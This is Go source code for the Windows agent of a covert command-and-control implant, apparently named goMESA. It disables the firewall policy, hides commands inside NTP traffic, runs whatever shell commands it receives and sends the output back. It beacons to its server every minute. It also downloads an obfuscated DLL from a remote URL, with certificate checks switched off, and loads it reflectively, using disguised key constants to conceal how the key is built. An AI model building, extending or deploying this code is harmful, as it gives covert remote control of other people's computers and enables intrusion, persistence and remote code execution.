//go:build windows
// +build windows

package main

import (
	"bytes"
	"crypto/tls"
	"encoding/binary"
	"encoding/json"
	"fmt"
	"github.com/google/gopacket"
	"github.com/google/gopacket/layers"
	"github.com/google/gopacket/pcap"
	"goMESA/internal/agent_env"
	"goMESA/internal/common"
	"goMESA/internal/reflective"
	"io/ioutil"
	"log"
	"net"
	"net/http"
	"os"
	"os/exec"
	"strings"
	"time"
)

var serverIP string

// PayloadMetadata represents additional data embedded with a payload
type PayloadMetadata struct {
	FunctionName string `json:"function_name"` // Name of the function to execute in the DLL
}

// AgentInfo stores information about the current agent
type AgentInfo struct {
	NetworkAdapter  string
	ServerIP        net.IP
	MyIP            net.IP
	AgentID         string
	LastHeartbeat   time.Time
	HeartbeatActive bool
}

// Global agent instance
var agent *AgentInfo

// Constants for obfuscation
const (
	SECTION_ALIGN_REQUIRED    = 0x53616D70 // "Samp" in ASCII
	FILE_ALIGN_MINIMAL        = 0x6C652D6B // "le-k" in ASCII
	PE_BASE_ALIGNMENT         = 0x65792D76 // "ey-v" in ASCII
	IMAGE_SUBSYSTEM_ALIGNMENT = 0x616C7565 // "alue" in ASCII
	PE_CHECKSUM_SEED          = 0x67891011
)

func init() {
	agent = &AgentInfo{
		HeartbeatActive: true,
		LastHeartbeat:   time.Now(),
	}

	// Get network adapter
	agent.NetworkAdapter = getNetworkAdapter()

	// Use the server IP from build flags, fallback to localhost if not set
	if serverIP != "" {
		agent.ServerIP = net.ParseIP(serverIP)
	} else {
		agent.ServerIP = net.ParseIP("127.0.0.1")
	}

	// Get agent's IP
	agent.MyIP = getLocalIP()

	// Generate a unique agent ID
	agent.AgentID = fmt.Sprintf("%s", agent.MyIP)
}

// getNetworkAdapter determines the network interface to use for packet capture
func getNetworkAdapter() string {
	// Windows-specific adapter detection
	cmd := exec.Command("cmd", "/c", "getmac /fo csv /v | findstr Ethernet")
	output, err := cmd.Output()
	if err != nil {
		log.Printf("Error getting network adapter: %v", err)
		return ""
	}

	// Parse the output to get the adapter ID
	text := string(output)
	startIndex := strings.Index(text, "_{")
	if startIndex == -1 {
		return ""
	}

	finalIndex := strings.Index(text[startIndex:], "}")
	if finalIndex == -1 {
		return ""
	}

	temp := text[startIndex+2 : startIndex+finalIndex]
	return fmt.Sprintf("\\Device\\NPF_{%s}", temp)
}

// getLocalIP gets the agent's local IP address
func getLocalIP() net.IP {
	addrs, err := net.InterfaceAddrs()
	if err != nil {
		fmt.Fprintf(os.Stderr, "Error getting IP address: %v\n", err)
		os.Exit(1)
	}

	for _, addr := range addrs {
		if ipnet, ok := addr.(*net.IPNet); ok && !ipnet.IP.IsLoopback() {
			if ipnet.IP.To4() != nil {
				return ipnet.IP
			}
		}
	}

	return nil
}

// setup performs initial agent setup
func setup() {
	fmt.Printf("Setting up agent on Windows\n")

	strIP := agent.ServerIP.String()
	commands := []string{
		"net start w32time",
		"sc config w32time start=auto",
		"netsh advfirewall set allprofiles firewallpolicy allowinbound,allowoutbound",
		"w32tm /config /syncfromflags:manual /manualpeerlist:" + strIP + " /update",
		"w32tm /resync",
	}

	// Execute setup commands
	for _, cmd := range commands {
		output, err := exec.Command("cmd", "/c", cmd).Output()
		if err != nil {
			log.Printf("Failed to execute command %s: %v", cmd, err)
			continue
		}
		log.Printf("Command output: %s", output)
	}
}

// runCommand executes a shell command and returns the output
func runCommand(command string) string {
	fmt.Printf("Executing command: %s\n", command)
	cmd := exec.Command("cmd", "/c", command)

	var outBuf, errBuf bytes.Buffer
	cmd.Stdout = &outBuf
	cmd.Stderr = &errBuf

	err := cmd.Run()
	if err != nil {
		return fmt.Sprintf("Error: %v\nStderr: %s", err, errBuf.String())
	}

	return outBuf.String()
}

// heartbeat sends periodic heartbeat signals to the C2 server
func heartbeat() {
	for agent.HeartbeatActive {
		// Create and send heartbeat packet
		packet := common.NewReferencePacket(agent.ServerIP.String(), common.CommandPing)
		err := packet.SendReferencePacket()
		if err != nil {
			log.Printf("Failed to send heartbeat: %v", err)
		} else {
			agent.LastHeartbeat = time.Now()
		}

		// Sleep for 60 seconds
		time.Sleep(60 * time.Second)
	}
}

// startSniffer sets up a packet capture to listen for C2 commands
func startSniffer() {
	var (
		iface   = agent.NetworkAdapter
		snaplen = int32(1600)
		filter  = fmt.Sprintf("udp and port 123 and dst %s", agent.MyIP)
	)

	// Open the device for capturing
	handle, err := pcap.OpenLive(iface, snaplen, false, pcap.BlockForever)
	if err != nil {
		log.Fatalf("Failed to open device %s: %v", iface, err)
	}
	defer handle.Close()

	// Set filter
	if err := handle.SetBPFFilter(filter); err != nil {
		log.Fatalf("Failed to set BPF filter: %v", err)
	}

	packetSource := gopacket.NewPacketSource(handle, handle.LinkType())
	log.Printf("Listening for commands on %s...", iface)

	// Buffer to accumulate command chunks
	var commandBuffer string

	// Process packets
	for packet := range packetSource.Packets() {

		// Get complete raw packet data
		packetData := packet.Data()
		log.Printf("DEBUG-PACKET-1: Received packet with %d bytes", len(packetData))

		// First attempt: try the application layer
		var payloadToCheck []byte
		appLayer := packet.ApplicationLayer()
		if appLayer != nil {
			payloadToCheck = appLayer.Payload()
			log.Printf("DEBUG-PACKET-2: Extracted application layer with %d bytes", len(payloadToCheck))
		} else {
			// If there's no application layer, use the entire packet
			payloadToCheck = packetData
			log.Printf("DEBUG-PACKET-2: No application layer, using entire packet")
		}

		// If application layer payload is empty but we have a UDP layer, get directly from that
		if len(payloadToCheck) == 0 {
			if udpLayer := packet.Layer(layers.LayerTypeUDP); udpLayer != nil {
				udp, _ := udpLayer.(*layers.UDP)
				payloadToCheck = udp.Payload
				log.Printf("DEBUG-PACKET-2B: Using UDP layer payload instead: %d bytes", len(payloadToCheck))
			}
		}

		// If we still have no payload data, try the entire packet as last resort
		if len(payloadToCheck) == 0 {
			payloadToCheck = packetData
			log.Printf("DEBUG-PACKET-2C: No payload found in layers, using entire packet")
		}

		// Search for our signature pattern 0x1a, 0x01, 0x0a, 0xf0 anywhere in the packet
		signaturePattern := []byte{0x1a, 0x01, 0x0a, 0xf0}
		signatureIndex := bytes.Index(payloadToCheck, signaturePattern)

		if signatureIndex == -1 {
			log.Printf("DEBUG-PACKET-3: Signature pattern not found in packet")
			continue // Signature not found, skip this packet
		}

		log.Printf("DEBUG-PACKET-4: Found signature at offset %d", signatureIndex)

		// Calculate the position of the command type (11 bytes after the start of signature)
		commandTypeIndex := signatureIndex + 11

		// Make sure there's enough data for the command type
		if len(payloadToCheck) < commandTypeIndex+4 {
			log.Printf("DEBUG-PACKET-5: Packet too short for command type")
			continue
		}

		// Extract the command type (4 bytes)
		commandType := string(payloadToCheck[commandTypeIndex : commandTypeIndex+4])
		log.Printf("DEBUG-PACKET-6: Command type: '%s'", commandType)

		// Check if we have a valid command type
		validCommand := false
		switch commandType {
		case common.CommandContinued, common.CommandDone, common.CommandKill, common.CommandPing, common.CommandWebConnect:
			validCommand = true
		}

		if !validCommand {
			log.Printf("DEBUG-PACKET-7: Unrecognized command type: '%s'", commandType)
			continue
		}

		// Calculate data index (15 bytes after start of signature)
		dataIndex := signatureIndex + 15

		// Extract and decrypt data if there's any
		var data string
		if len(payloadToCheck) > dataIndex {
			// Get encrypted bytes
			encryptedBytes := payloadToCheck[dataIndex:]
			log.Printf("DEBUG-PACKET-8: Encrypted data length: %d bytes", len(encryptedBytes))

			// Decrypt using XOR with '.'
			decrypted := common.XORDecrypt(encryptedBytes, '.')

			// Trim null bytes
			cleanData := bytes.Trim(decrypted, "\x00")
			data = string(cleanData)

			log.Printf("DEBUG-PACKET-9: Decrypted command data: '%s'", data)
		} else {
			log.Printf("DEBUG-PACKET-10: No command data in packet")
		}

		// Process the command based on its type
		switch commandType {
		case common.CommandContinued:
			// Accumulate command chunks
			log.Printf("DEBUG-COMMAND-1: Received command chunk: '%s'", data)
			commandBuffer += data

		case common.CommandDone:
			// Final chunk received, execute the command
			log.Printf("DEBUG-COMMAND-2: Received final command chunk: '%s'", data)
			commandBuffer += data

			log.Printf("DEBUG-COMMAND-3: Executing command: '%s'", commandBuffer)
			output := runCommand(commandBuffer)
			log.Printf("DEBUG-COMMAND-4: Command execution complete")
			log.Printf("DEBUG-COMMAND-5: Command output: '%s'", output)

			// Create the response packet
			log.Printf("DEBUG-COMMAND-6: Creating response packet")
			responsePacket := common.NewOutputPacket(agent.ServerIP.String(), output)

			// Send the response
			log.Printf("DEBUG-COMMAND-7: Sending command output to server")
			err := responsePacket.ChunkAndSendOutput()
			if err != nil {
				log.Printf("DEBUG-COMMAND-8: Error sending output: %v", err)
			} else {
				log.Printf("DEBUG-COMMAND-9: Command output sent successfully")
			}

			// Clear the buffer
			commandBuffer = ""

		case common.CommandKill:
			// Kill the agent
			log.Printf("DEBUG-COMMAND-10: Received kill command. Shutting down...")
			runCommand("net stop w32time")
			runCommand("w32tm /unregister")
			agent.HeartbeatActive = false
			os.Exit(0)

		case common.CommandPing:
			// Send a heartbeat in response
			log.Printf("DEBUG-COMMAND-11: Received ping command, sending response")
			packet := common.NewReferencePacket(agent.ServerIP.String(), common.CommandPing)
			err := packet.SendReferencePacket()
			if err != nil {
				log.Printf("DEBUG-COMMAND-12: Failed to send ping response: %v", err)
			} else {
				log.Printf("DEBUG-COMMAND-13: Ping response sent successfully")
			}

		case common.CommandWebConnect:
			log.Printf("WEBCON-DEBUG-10: Received web connect command")

			// Extract the payload data (JSON format)
			if len(payloadToCheck) <= dataIndex {
				log.Printf("DEBUG-COMMAND-21: No payload data in web connect command")
				continue
			}

			// Get the web connect command data
			payloadData := string(bytes.Trim(common.XORDecrypt(payloadToCheck[dataIndex:], '.'), "\x00"))
			log.Printf("WEBCON-DEBUG-12: Web connect payload: %s", payloadData)

			// Parse the JSON payload
			var webConnectPayload common.WebConnectPayload
			if err := json.Unmarshal([]byte(payloadData), &webConnectPayload); err != nil {
				log.Printf("DEBUG-COMMAND-23: Failed to parse web connect payload: %v", err)
				continue
			}

			log.Printf("WEBCON-DEBUG-14: Connecting to server URL: %s", webConnectPayload.ServerURL)

			// Execute the web connect command in a separate goroutine
			go executeWebConnect(webConnectPayload)
		}
	}
}

func main() {
	// Print debug info
	fmt.Printf("Agent started with ID: %s\n", agent.AgentID)
	fmt.Printf("Operating System: Windows\n")
	fmt.Printf("Network Adapter: %s\n", agent.NetworkAdapter)
	fmt.Printf("Server IP: %s\n", agent.ServerIP)
	fmt.Printf("My IP: %s\n", agent.MyIP)

	// Perform initial setup
	setup()

	// Start the heartbeat goroutine
	go heartbeat()

	// Start the packet sniffer (this blocks)
	startSniffer()
}

// getPESectionAlignmentString constructs part of our shared secret
func getPESectionAlignmentString() string {
	buffer := make([]byte, 16)
	binary.LittleEndian.PutUint32(buffer[0:4], SECTION_ALIGN_REQUIRED)
	binary.LittleEndian.PutUint32(buffer[4:8], FILE_ALIGN_MINIMAL)
	binary.LittleEndian.PutUint32(buffer[8:12], PE_BASE_ALIGNMENT)
	binary.LittleEndian.PutUint32(buffer[12:16], IMAGE_SUBSYSTEM_ALIGNMENT)
	return string(buffer)
}

// verifyPEChecksumValue constructs the second part of our shared secret
func verifyPEChecksumValue(seed uint32) string {
	result := make([]byte, 4)
	checksum := seed
	for i := 0; i < 4; i++ {
		checksum = ((checksum << 3) | (checksum >> 29)) ^ uint32(i*0x37)
		result[i] = byte(checksum & 0xFF)
	}
	return string(result)
}

// generatePEValidationKey generates the shared secret key
func generatePEValidationKey() string {
	alignmentSignature := getPESectionAlignmentString()
	checksumSignature := verifyPEChecksumValue(PE_CHECKSUM_SEED)
	result := alignmentSignature + checksumSignature
	fmt.Printf("AGENT-KEY-DEBUG: Generated shared secret: % x\n", []byte(result))
	return alignmentSignature + checksumSignature
}

// deriveKeyFromParams derives an encryption key from request parameters
func deriveKeyFromParams(timestamp, clientID string, sharedSecret string) string {
	combined := sharedSecret + timestamp + clientID
	key := make([]byte, 32)
	for i := 0; i < 32; i++ {
		if i < len(combined) {
			key[i] = combined[i]
		} else {
			key[i] = combined[i%len(combined)]
		}
	}
	return string(key)
}

// deobfuscatePayload deobfuscates the payload using XOR with rolling key
func deobfuscatePayload(data []byte, key string) ([]byte, PayloadMetadata, error) {
	// Ensure data has at least 4 bytes for metadata length
	if len(data) < 4 {
		return nil, PayloadMetadata{}, fmt.Errorf("payload too short")
	}

	// Extract metadata length from first 4 bytes (unencrypted)
	metadataLen := binary.LittleEndian.Uint32(data[0:4])
	fmt.Printf("DEOBFUSCATE-DEBUG-1: Metadata length from header: %d\n", metadataLen)

	// Sanity check the metadata length
	if metadataLen > 1024 || 4+metadataLen > uint32(len(data)) {
		return nil, PayloadMetadata{}, fmt.Errorf("invalid metadata length: %d", metadataLen)
	}

	fmt.Printf("DEOBFUSCATE-DEBUG-2: Derived key for deobfuscation: %q\n", key)

	// Create result buffer for deobfuscated data
	result := make([]byte, len(data)-4)
	keyBytes := []byte(key)
	keyLen := len(keyBytes)

	// Deobfuscate everything after the length field
	for i := 4; i < len(data); i++ {
		// Use the exact same index i as server would have used when encrypting
		keyByte := keyBytes[(i)%keyLen] ^ byte(i&0xFF)

		// Store at adjusted position in result
		result[i-4] = data[i] ^ keyByte
	}

	// Extract and parse metadata
	metadataBytes := result[:metadataLen]
	fmt.Printf("DEOBFUSCATE-DEBUG-3: Raw metadata bytes: % x\n", metadataBytes[:min(len(metadataBytes), 64)])
	fmt.Printf("DEOBFUSCATE-DEBUG-4: Deobfuscated metadata as string: %q\n", string(metadataBytes))

	var metadata PayloadMetadata
	if err := json.Unmarshal(metadataBytes, &metadata); err != nil {
		return nil, PayloadMetadata{}, fmt.Errorf("failed to parse metadata: %v", err)
	}

	fmt.Printf("DEOBFUSCATE-DEBUG-5: Successfully parsed metadata: %+v\n", metadata)

	// Return the actual payload (everything after metadata)
	return result[metadataLen:], metadata, nil
}

// executeWebConnect handles the web connect command for reflective loading
func executeWebConnect(payload common.WebConnectPayload) {
	log.Printf("Executing web connect command to %s", payload.ServerURL)

	// Create a response message to send back to the server
	var responseMsg string

	var success bool

	// Download and deobfuscate the payload
	dllBytes, metadata, err := downloadPayload(payload.ServerURL)
	if err != nil {
		responseMsg = fmt.Sprintf("Failed to download payload: %v", err)
		log.Printf("Error: %s", responseMsg)
	} else {
		// Create a reflective loader instance
		loader := reflective.NewReflectiveLoader()

		// Perform reflective loading through the interface
		success, err := loader.LoadAndExecuteDLL(dllBytes, metadata.FunctionName)
		if err != nil {
			responseMsg = fmt.Sprintf("Failed to load DLL: %v", err)
			log.Printf("Error: %s", responseMsg)
		} else if success {
			responseMsg = fmt.Sprintf("Successfully executed function %s", metadata.FunctionName)
			log.Printf("Success: %s", responseMsg)
		} else {
			responseMsg = fmt.Sprintf("Function %s executed but returned FALSE", metadata.FunctionName)
			log.Printf("Warning: %s", responseMsg)
		}
	}

	// Send the response back to the server
	log.Printf("Sending response for web connect command")
	responsePacket := common.NewOutputPacket(agent.ServerIP.String(), responseMsg)

	// Send the response
	// Format the response as JSON
	responseData := map[string]interface{}{
		"success": err == nil && success,
	}

	if err != nil {
		responseData["message"] = fmt.Sprintf("Failed to load DLL: %v", err)
	} else if success {
		responseData["message"] = fmt.Sprintf("Successfully executed function %s", metadata.FunctionName)
	} else {
		responseData["message"] = fmt.Sprintf("Function %s executed but returned FALSE", metadata.FunctionName)
	}

	// Convert to JSON
	responseJSON, err := json.Marshal(responseData)
	if err != nil {
		log.Printf("Error marshaling response: %v", err)
		responseMsg = fmt.Sprintf("Error formatting response: %v", err)
	} else {
		responseMsg = "ReflectiveLoading:" + string(responseJSON)
	}

	// Send the response back to the server
	log.Printf("Sending response for web connect command")
	responsePacket = common.NewOutputPacket(agent.ServerIP.String(), responseMsg)

	// Send the response
	if err := responsePacket.ChunkAndSendOutput(); err != nil {
		log.Printf("Error sending web connect response: %v", err)
	} else {
		log.Printf("Web connect response sent successfully")
	}
}

// downloadPayload downloads and processes the payload from the server
func downloadPayload(serverURL string) ([]byte, PayloadMetadata, error) {
	fmt.Printf("DOWNLOAD-DEBUG-1: Connecting to server: %s\n", serverURL)

	// Create HTTP client with TLS config (skip verification for simplicity)
	tr := &http.Transport{
		TLSClientConfig: &tls.Config{
			InsecureSkipVerify: true,
		},
	}
	client := &http.Client{
		Transport: tr,
		Timeout:   30 * time.Second,
	}

	// Get environmental ID and timestamp
	clientID, err := agent_env.GetEnvironmentalID()
	if err != nil {
		return nil, PayloadMetadata{}, fmt.Errorf("failed to get client ID: %v", err)
	}

	timestamp := fmt.Sprintf("%d", time.Now().Unix())
	fmt.Printf("[+] Using timestamp: %s\n", timestamp)

	// Create custom User-Agent with embedded parameters
	customUA := fmt.Sprintf("Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 "+
		"(KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36 rv:%s-%s",
		timestamp, clientID)

	// Create request
	req, err := http.NewRequest("GET", serverURL, nil)
	if err != nil {
		return nil, PayloadMetadata{}, fmt.Errorf("failed to create request: %v", err)
	}

	// Set headers
	req.Header.Set("User-Agent", customUA)

	// Send request
	resp, err := client.Do(req)
	if err != nil {
		return nil, PayloadMetadata{}, fmt.Errorf("request failed: %v", err)
	}
	defer resp.Body.Close()

	// Check status code
	if resp.StatusCode != http.StatusOK {
		return nil, PayloadMetadata{}, fmt.Errorf("server returned error: %d", resp.StatusCode)
	}

	// Read response body
	obfuscatedData, err := ioutil.ReadAll(resp.Body)
	if err != nil {
		return nil, PayloadMetadata{}, fmt.Errorf("failed to read response body: %v", err)
	}

	// After retrieving the content:
	fmt.Printf("DOWNLOAD-DEBUG-2: Downloaded %d bytes\n", len(obfuscatedData))
	fmt.Printf("DOWNLOAD-DEBUG-3: First 20 bytes: % x\n", obfuscatedData[:min(20, len(obfuscatedData))])

	// Generate shared secret
	sharedSecret := generatePEValidationKey()

	// Derive key using the same method as the server
	key := deriveKeyFromParams(timestamp, clientID, sharedSecret)

	// Deobfuscate payload and extract metadata
	fmt.Println("[+] Deobfuscating payload...")
	dllBytes, metadata, err := deobfuscatePayload(obfuscatedData, key)
	if err != nil {
		return nil, PayloadMetadata{}, fmt.Errorf("failed to deobfuscate payload: %v", err)
	}

	fmt.Printf("[+] Target function: %s\n", metadata.FunctionName)

	fmt.Printf("DOWNLOAD-DEBUG-4: Deobfuscated payload metadata: %+v\n", metadata)
	fmt.Printf("DOWNLOAD-DEBUG-5: Deobfuscated DLL size: %d bytes\n", len(dllBytes))

	return dllBytes, metadata, nil
}
